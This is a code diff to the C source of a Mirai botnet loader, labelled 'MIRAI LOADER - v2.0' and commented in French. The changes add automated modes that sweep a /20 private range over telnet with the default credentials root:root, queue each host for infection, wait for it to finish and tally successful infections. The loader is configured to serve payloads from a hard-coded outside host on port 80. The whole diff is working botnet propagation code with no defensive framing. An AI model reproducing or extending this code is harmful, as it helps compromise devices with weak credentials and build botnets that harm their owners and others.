@@ -38,22 +38,21 @@ void uint32_to_ip(uint32_t ip, char *buffer)
             ip & 0xFF);
 }
 
-// ==================== SCAN AUTOMATIQUE ====================
+// ==================== SCAN AUTOMATIQUE AVEC PAUSE ====================
 
 void auto_scan(void)
 {
     struct telnet_info info;
     uint32_t total = 0;
+    uint32_t infected = 0;
     
     printf("\n========================================\n");
     printf("    SCAN AUTOMATIQUE - RESEAU /20\n");
     printf("    172.31.16.0 a 172.31.31.255\n");
     printf("========================================\n\n");
     
-    // Pour chaque troisième octet de 16 à 31 (inclus)
     for (int o3 = 16; o3 <= 31; o3++)
     {
-        // Pour chaque quatrième octet de 1 à 254
         for (int o4 = 1; o4 <= 254; o4++)
         {
             char strbuf[128];
@@ -62,16 +61,95 @@ void auto_scan(void)
             memset(&info, 0, sizeof(struct telnet_info));
             if (telnet_info_parse(strbuf, &info) != NULL)
             {
+                // Sauvegarder le nombre de connexions actives avant l'infection
+                int before = ATOMIC_GET(&srv->curr_open);
+                
                 server_queue_telnet(srv, &info);
                 total++;
-                printf("[%4d] Queued: 172.31.%d.%d\n", total, o3, o4);
-                usleep(10000); // Pause légère (10ms)
+                printf("\n[%4d] Tentative infection: 172.31.%d.%d\n", total, o3, o4);
+                
+                // Attendre que cette infection soit terminée (connexion se ferme)
+                printf("    Attente de l'infection...\n");
+                while (ATOMIC_GET(&srv->curr_open) > before)
+                {
+                    usleep(100000); // Attendre 0.1 seconde
+                }
+                
+                // Attendre un peu après la fermeture pour être sûr
+                usleep(500000); // 0.5 seconde
+                
+                // Vérifier si l'infection a réussi
+                if (ATOMIC_GET(&srv->total_successes) > infected)
+                {
+                    infected = ATOMIC_GET(&srv->total_successes);
+                    printf("    ✅ Infection réussie sur 172.31.%d.%d\n", o3, o4);
+                }
+                else
+                {
+                    printf("    ❌ Échec sur 172.31.%d.%d\n", o3, o4);
+                }
             }
         }
     }
     
-    printf("\n[*] %d IPs mises en file d'attente.\n", total);
-    printf("[*] Infection en cours...\n");
+    printf("\n[*] %d IPs tentées, %d infections réussies.\n", total, infected);
+    printf("[*] Infection terminée.\n");
+}
+
+// ==================== SCAN AVEC LIMITE DE CONCURRENCE ====================
+
+void auto_scan_limited(void)
+{
+    struct telnet_info info;
+    uint32_t total = 0;
+    uint32_t infected = 0;
+    int max_concurrent = 1;  // Une seule infection à la fois
+    
+    printf("\n========================================\n");
+    printf("    SCAN AUTOMATIQUE - RESEAU /20\n");
+    printf("    Mode: Une infection à la fois\n");
+    printf("========================================\n\n");
+    
+    for (int o3 = 16; o3 <= 31; o3++)
+    {
+        for (int o4 = 1; o4 <= 254; o4++)
+        {
+            // Attendre que les connexions actives soient terminées
+            while (ATOMIC_GET(&srv->curr_open) >= max_concurrent)
+            {
+                usleep(100000);
+            }
+            
+            char strbuf[128];
+            snprintf(strbuf, sizeof(strbuf), "172.31.%d.%d:23 root:root", o3, o4);
+            
+            memset(&info, 0, sizeof(struct telnet_info));
+            if (telnet_info_parse(strbuf, &info) != NULL)
+            {
+                server_queue_telnet(srv, &info);
+                total++;
+                printf("[%4d] Infection: 172.31.%d.%d\n", total, o3, o4);
+                
+                // Attendre la fin de cette infection
+                while (ATOMIC_GET(&srv->curr_open) > 0)
+                {
+                    usleep(100000);
+                }
+                
+                if (ATOMIC_GET(&srv->total_successes) > infected)
+                {
+                    infected = ATOMIC_GET(&srv->total_successes);
+                    printf("    ✅ SUCCÈS (total: %d)\n", infected);
+                }
+                else
+                {
+                    printf("    ❌ ÉCHEC\n");
+                }
+            }
+        }
+    }
+    
+    printf("\n[*] Terminé: %d/%d succès.\n", infected, total);
 }
 
 // ==================== MAIN ====================
@@ -102,7 +180,7 @@ int main(int argc, char **args)
 
     // ==================== CRÉATION DU SERVEUR ====================
     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 
-                              1024 * 64, "13.63.167.63", 80, "13.63.167.63")) == NULL)
+                              1024 * 64, "13.63.167.63 ", 80, "13.63.167.63 ")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
@@ -116,22 +194,22 @@ int main(int argc, char **args)
     printf("        MIRAI LOADER - v2.0\n");
     printf("========================================\n\n");
     printf("1. Mode Manuel\n");
-    printf("2. Mode Auto (Scan 192.168.1.0/24)\n");
+    printf("2. Mode Auto (1 infection à la fois)\n");
+    printf("3. Mode Auto (scan complet sans pause)\n");
     printf("\n");
     printf("Choix: ");
     scanf("%d", &choice);
-    getchar();  // Consomme le newline
+    getchar();
 
     printf("\n");
 
-    // ==================== EXÉCUTION ====================
     switch (choice)
     {
         case 1:
             // ==================== MODE MANUEL ====================
             printf("[*] Mode Manuel\n");
             printf("    Format: IP:PORT USER:PASS\n");
-            printf("    Exemple: 192.168.1.11:23 root:root\n");
+            printf("    Exemple: 172.31.24.107:23 root:root\n");
             printf("    Tapez Ctrl+D pour quitter\n\n");
             
             while (TRUE)
@@ -156,15 +234,26 @@ int main(int argc, char **args)
                 {
                     server_queue_telnet(srv, &info);
                     total++;
-                    printf("[%d] Infecting %s\n", total, strbuf);
-                    if (total % 100 == 0)
-                        sleep(1);
+                    printf("[%d] Infection lancée vers %s\n", total, strbuf);
+                    
+                    // Attendre la fin de l'infection
+                    while (ATOMIC_GET(&srv->curr_open) > 0)
+                    {
+                        usleep(100000);
+                    }
+                    printf("    Infection terminée\n");
                 }
+                usleep(500000);
             }
             break;
             
         case 2:
-            // ==================== MODE AUTO ====================
+            // ==================== MODE AUTO (une infection à la fois) ====================
+            auto_scan_limited();
+            break;
+            
+        case 3:
+            // ==================== MODE AUTO (original) ====================
             auto_scan();
             break;
             
@@ -173,7 +262,7 @@ int main(int argc, char **args)
             break;
     }
 
-    printf("\n[*] Scan terminé. Attente des infections...\n");
+    printf("\n[*] Scan terminé. Attente des dernières infections...\n");
     
     while(ATOMIC_GET(&srv->curr_open) > 0)
         sleep(1);
